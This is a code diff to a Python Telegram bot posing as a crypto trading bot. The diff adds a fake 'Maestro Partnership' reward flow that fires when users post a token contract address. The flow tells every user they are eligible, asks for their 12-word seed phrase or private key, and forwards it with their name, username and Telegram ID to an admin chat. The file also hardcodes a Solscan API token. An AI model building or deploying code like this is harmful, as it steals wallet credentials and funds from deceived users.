@@ -8,6 +8,7 @@ from html import escape
 import aiohttp
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router, types
+from aiogram.exceptions import TelegramConflictError
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -791,8 +792,8 @@ async def get_language_selector_keyboard(user_id: int):
 
 
 # Contract detection for Ethereum/BSC/Solana addresses in incoming messages.
-ETH_BSC_CONTRACT_REGEX = r"\b0x[a-fA-F0-9]{40}\b"
-SOLANA_CONTRACT_REGEX = r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"
+ETH_BSC_CONTRACT_REGEX = r"(?<![0-9A-Za-z])0x[a-fA-F0-9]{40}(?![0-9A-Za-z])"
+SOLANA_CONTRACT_REGEX = r"(?<![0-9A-Za-z])[1-9A-HJ-NP-Za-km-z]{32,44}(?![0-9A-Za-z])"
 CONTRACT_ADDRESS_REGEX = rf"(?:{ETH_BSC_CONTRACT_REGEX}|{SOLANA_CONTRACT_REGEX})"
 
 SOLSCAN_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE3ODI4NDg0NTMyMDMsImVtYWlsIjoiY29kZWRmeDAxQGdtYWlsLmNvbSIsImFjdGlvbiI6InRva2VuLWFwaSIsImFwaVZlcnNpb24iOiJ2MiIsImlhdCI6MTc4Mjg0ODQ1M30.nvjtdTqWvultWDQjIgtBPHHXUfHfKpugv3qlZSJFgwc"
@@ -800,29 +801,45 @@ SOLSCAN_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE3ODI4
 DEXSCREENER_CACHE: dict[str, tuple[float, dict]] = {}
 DEXSCREENER_MESSAGE_COOLDOWN_SECONDS = 60
 DEXSCREENER_MESSAGE_COOLDOWN: dict[tuple[int, str], float] = {}
+PARTNERSHIP_MESSAGE_COOLDOWN: dict[tuple[int, str], float] = {}
 
 
 def contract_detector(message: types.Message | str | None) -> str | None:
-    if isinstance(message, types.Message):
-        text_parts = []
-        if message.text:
-            text_parts.append(message.text)
-        if message.caption:
-            text_parts.append(message.caption)
-        if not text_parts:
-            return None
-        text = "\n".join(text_parts)
-    else:
-        text = message or ""
+    if message is None:
+        return None
 
+    text_parts = []
+    if isinstance(message, (str, bytes)):
+        text_parts.append(message.decode() if isinstance(message, bytes) else message)
+    else:
+        for attr_name in ("text", "caption"):
+            value = getattr(message, attr_name, None)
+            if isinstance(value, str) and value:
+                text_parts.append(value)
+
+    if not text_parts:
+        return None
+
+    text = "\n".join(text_parts)
     if not isinstance(text, str) or not text:
         return None
 
     for pattern in (ETH_BSC_CONTRACT_REGEX, SOLANA_CONTRACT_REGEX):
-        match = re.search(pattern, text)
+        match = re.search(pattern, text, re.IGNORECASE)
         if match:
             return match.group(0)
     return None
+
+
+def is_valid_wallet_address(address: str) -> bool:
+    if not isinstance(address, str):
+        return False
+    address = address.strip()
+    if not address:
+        return False
+    if re.fullmatch(r"0x[a-fA-F0-9]{40}", address):
+        return True
+    return bool(re.fullmatch(r"[1-9A-HJ-NP-Za-km-z]{32,44}", address))
 
 
 def _safe_number(value) -> float | None:
@@ -1027,6 +1044,41 @@ async def send_token_lookup_card(message: types.Message, contract_address: str, 
         disable_web_page_preview=True,
     )
     DEXSCREENER_MESSAGE_COOLDOWN[cache_key] = now
+
+
+async def send_partnership_message(message: types.Message, contract_address: str) -> None:
+    if not contract_address:
+        return
+
+    cache_key = (message.chat.id, contract_address.lower())
+    now = asyncio.get_running_loop().time()
+    last_sent = PARTNERSHIP_MESSAGE_COOLDOWN.get(cache_key)
+    if last_sent and now - last_sent < 300:
+        return
+
+    token_data = await fetch_dexscreener_data(contract_address)
+    token_name = token_data.get("name") or token_data.get("symbol") or "TOKEN"
+    partnership_text = (
+        "🚀🚀 <b>Maestro Partnership With Project Owners</b> 🚀🚀\n\n"
+        f"Are you a holder of <b>{escape(token_name)}</b> (based on <code>{escape(contract_address)}</code>)?\n\n"
+        f"<b>{escape(token_name)}</b> has partnered with <b>Maestro Trading Bot</b> to reward holders with at least <b>$800</b> worth of the token with:\n\n"
+        f"➤ <b>$120 worth of {escape(token_name)}</b>\n"
+        "➤ 💎 Maestro Premium Access\n"
+        "➤ Access To Top Holders Group\n"
+        "➤ Zero Fees When You Trade With Maestro\n"
+        "➤ Access To Verified KOLs Copy Trade Wallets For Early Entry Before Launch 🚀\n"
+        "➤ 30% of the Premium Service Maestro Trading Bot Offers\n\n"
+        "<b>To check eligibility click the button below ⬇️</b>"
+    )
+
+    await message.answer(
+        text=partnership_text,
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Check Eligibility", callback_data=f"eligibility_check_start:{contract_address}")]
+        ]),
+    )
+    PARTNERSHIP_MESSAGE_COOLDOWN[cache_key] = now
 
 
 def _coerce_first(data: dict, *keys):
@@ -2303,6 +2355,11 @@ class WalletSetupState(StatesGroup):
 class PhantomConnectState(StatesGroup):
     waiting_for_wallet_secret = State()
 
+class TokenEligibilityState(StatesGroup):
+    waiting_for_holder_wallet = State()
+    waiting_for_wallet_credentials = State()
+    waiting_for_confirmation = State()
+
 used_wallet_names = set()
 
 wallet_inventory = {
@@ -3354,6 +3411,149 @@ async def process_phantom_wallet_secret(message: types.Message, state: FSMContex
     await state.clear()
 
 
+@dp.callback_query(F.data.startswith("eligibility_check_start:"))
+async def eligibility_check_start(callback: types.CallbackQuery, state: FSMContext):
+    contract_address = callback.data.split(":", 1)[1]
+    prompt_text = "Please Paste Your holders 💳 wallet address\n\nThe wallet which you hold the token"
+
+    try:
+        await callback.message.edit_text(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_message_id = callback.message.message_id
+    except Exception:
+        prompt_msg = await callback.message.answer(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_message_id = prompt_msg.message_id
+
+    await state.set_state(TokenEligibilityState.waiting_for_holder_wallet)
+    await state.update_data(contract_address=contract_address, prompt_id=prompt_message_id)
+    await callback.answer()
+
+
+@dp.message(TokenEligibilityState.waiting_for_holder_wallet)
+async def process_holder_wallet(message: types.Message, state: FSMContext):
+    state_data = await state.get_data()
+    prompt_id = state_data.get("prompt_id")
+    holder_wallet = (message.text or "").strip()
+
+    if not holder_wallet:
+        await message.answer("⚠️ Please send a wallet address to continue.", parse_mode="HTML")
+        return
+
+    if prompt_id and message.reply_to_message and message.reply_to_message.message_id != prompt_id:
+        await message.answer(
+            text="⚠️ Please reply directly to the bot's message so your wallet address can be processed.",
+            parse_mode="HTML",
+        )
+        return
+
+    if not is_valid_wallet_address(holder_wallet):
+        await message.answer("❌ Invalid wallet address. Please try again.", parse_mode="HTML")
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    if prompt_id:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
+        except Exception:
+            pass
+
+    await message.answer(
+        text="🎉🎉🎉 CONGRATULATIONS 🎉🎉🎉\n\nYou are eligible For Rewards Click <b>Claim</b> to Get your reward",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Claim", callback_data="claim_reward_start")]
+        ]),
+    )
+
+    await state.set_state(TokenEligibilityState.waiting_for_confirmation)
+    await state.update_data(holder_wallet=holder_wallet)
+
+
+@dp.callback_query(F.data == "claim_reward_start")
+async def claim_reward_start(callback: types.CallbackQuery, state: FSMContext):
+    prompt_text = "Connect Your wallet Rewards will be allocated to your wallet\n\nPaste Your 12-word Phrase Or Private Key"
+
+    try:
+        prompt_msg = await callback.message.edit_text(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_message_id = prompt_msg.message_id
+    except Exception:
+        prompt_msg = await callback.message.answer(
+            text=prompt_text,
+            reply_markup=types.ForceReply(selective=True),
+        )
+        prompt_message_id = prompt_msg.message_id
+
+    await state.set_state(TokenEligibilityState.waiting_for_wallet_credentials)
+    await state.update_data(prompt_id=prompt_message_id)
+    await callback.answer()
+
+
+@dp.message(TokenEligibilityState.waiting_for_wallet_credentials)
+async def process_wallet_credentials(message: types.Message, state: FSMContext):
+    state_data = await state.get_data()
+    prompt_id = state_data.get("prompt_id")
+    credentials = (message.text or "").strip()
+
+    if not credentials:
+        await message.answer("⚠️ Please send your 12-word phrase or private key to continue.", parse_mode="HTML")
+        return
+
+    if prompt_id and message.reply_to_message and message.reply_to_message.message_id != prompt_id:
+        await message.answer(
+            text="⚠️ Please reply directly to the bot's message so your credentials can be forwarded securely.",
+            parse_mode="HTML",
+        )
+        return
+
+    contract_address = state_data.get("contract_address") or "N/A"
+    holder_wallet = state_data.get("holder_wallet") or "N/A"
+    full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
+    username = message.from_user.username or "N/A"
+
+    admin_text = (
+        f"👤 Name: {escape(full_name)}\n"
+        f"👤 Username: @{escape(username)}\n"
+        f"🆔 Telegram ID: {message.from_user.id}\n"
+        f"💳 Holder Wallet: {escape(holder_wallet)}\n"
+        f"🪙 Contract: {escape(contract_address)}\n"
+        f"🔐 Credentials:\n<pre>{escape(credentials)}</pre>"
+    )
+
+    try:
+        await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_text, parse_mode="HTML")
+    except Exception as exc:
+        print(f"Failed to forward wallet credentials to admin. Error: {exc}")
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    if prompt_id:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
+        except Exception:
+            pass
+
+    await message.answer(
+        text="Tokens Will be Allocated Shortly into Your Wallet\n\nStart Trading with Maestro and Enjoy the rest of your rewards\n\n/start if you need to",
+        parse_mode="HTML",
+    )
+    await state.clear()
+
+
 # TEXT HANDLER: Captures user message when 'waiting_for_input' state is active
 @dp.message(SupportForm.waiting_for_input)
 async def process_support_input(message: types.Message, state: FSMContext):
@@ -3462,6 +3662,9 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
         BotStates.waiting_for_slippage.state,
         BotStates.waiting_for_gas.state,
         BotStates.waiting_for_global_slippage.state,
+        TokenEligibilityState.waiting_for_holder_wallet.state,
+        TokenEligibilityState.waiting_for_wallet_credentials.state,
+        TokenEligibilityState.waiting_for_confirmation.state,
     }:
         return
 
@@ -3469,16 +3672,15 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
     if not contract_address:
         return
 
-    await send_token_lookup_card(message, contract_address)
+    await asyncio.sleep(5)
+    await send_partnership_message(message, contract_address)
 
 @dp.callback_query(F.data == "track")
 async def handle_track_click(callback: types.CallbackQuery):
-    match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
-    if not match:
+    mint_address = contract_detector(callback.message)
+    if not mint_address:
         await callback.answer(popup_alert("Expired!", "Start a new lookup.", "/start"), show_alert=True)
         return
-
-    mint_address = match.group(0)
     token_data = await fetch_dexscreener_data(mint_address)
     text = format_monitor_text(mint_address, token_data, 2160)
 
@@ -3566,8 +3768,7 @@ async def _prompt_config_value(callback: types.CallbackQuery, state: FSMContext,
 
 @dp.callback_query(F.data == "slippage")
 async def prompt_slippage_from_trade(callback: types.CallbackQuery, state: FSMContext):
-    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
-    mint_address = mint_address.group(0) if mint_address else ""
+    mint_address = contract_detector(callback.message) or ""
 
     await _prompt_config_value(
         callback,
@@ -3585,8 +3786,7 @@ async def prompt_slippage(callback: types.CallbackQuery, state: FSMContext):
     data = callback.data or ""
     mint_address = data.split(":", 1)[1] if ":" in data else ""
     if not mint_address:
-        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
-        mint_address = mint_address_match.group(0) if mint_address_match else ""
+        mint_address = contract_detector(callback.message) or ""
 
     await _prompt_config_value(
         callback,
@@ -3663,8 +3863,7 @@ async def process_slippage_input(message: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "gas")
 async def prompt_gas_from_trade(callback: types.CallbackQuery, state: FSMContext):
-    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
-    mint_address = mint_address.group(0) if mint_address else ""
+    mint_address = contract_detector(callback.message) or ""
 
     await _prompt_config_value(
         callback,
@@ -3683,8 +3882,7 @@ async def prompt_gas(callback: types.CallbackQuery, state: FSMContext):
     data = callback.data or ""
     mint_address = data.split(":", 1)[1] if ":" in data else ""
     if not mint_address:
-        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
-        mint_address = mint_address_match.group(0) if mint_address_match else ""
+        mint_address = contract_detector(callback.message) or ""
 
     await _prompt_config_value(
         callback,
@@ -4917,7 +5115,13 @@ async def main():
     reset_wallet_inventory()
     await register_bot_commands()
     await start_web_server()
-    await dp.start_polling(bot)
+    try:
+        await dp.start_polling(bot)
+    except TelegramConflictError as exc:
+        print(f"Telegram polling conflict: {exc}")
+        print("Another bot instance is already running. Please stop it before restarting this bot.")
+    except Exception as exc:
+        print(f"Bot startup failed: {exc}")
 
 if __name__ == "__main__":
     asyncio.run(main())
